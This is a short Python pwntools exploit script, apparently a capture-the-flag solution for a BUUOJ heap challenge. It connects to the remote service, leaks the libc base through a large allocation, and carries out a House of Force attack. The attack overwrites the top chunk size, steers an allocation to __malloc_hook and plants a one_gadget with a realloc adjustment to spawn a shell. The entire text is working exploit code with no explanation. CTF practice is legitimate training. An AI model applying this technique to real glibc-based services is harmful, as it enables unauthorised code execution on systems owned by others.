from pwn import *

io=remote('node3.buuoj.cn',26478)
libc=ELF('./libc-2.23.so')

def add(size,data):
    io.recvuntil('2:puts\n')
    io.sendline('1')
    io.recvuntil('size\n')
    io.sendline(str(size))
    io.recvuntil('addr ')
    addr=int(io.recvline()[2:],16)
    io.recvuntil('content')
    io.send(data)
    return addr


a=add(0x200000,'a')
libc_base=a+0x200FF0
print(hex(libc_base))
malloc_hook=libc_base+libc.sym["__malloc_hook"]
one_gadget=libc_base+0x4526a
realloc=libc_base+libc.sym['__libc_realloc']

a=add(0x10,'a'*0x18+p64(0xffffffffffffffff))
top_chunk=a+0x10
print(hex(top_chunk))
off=malloc_hook-top_chunk-0x30
add(off,'a')
add(0x10,'a'*0x8+p64(one_gadget)+p64(realloc+16))

io.interactive()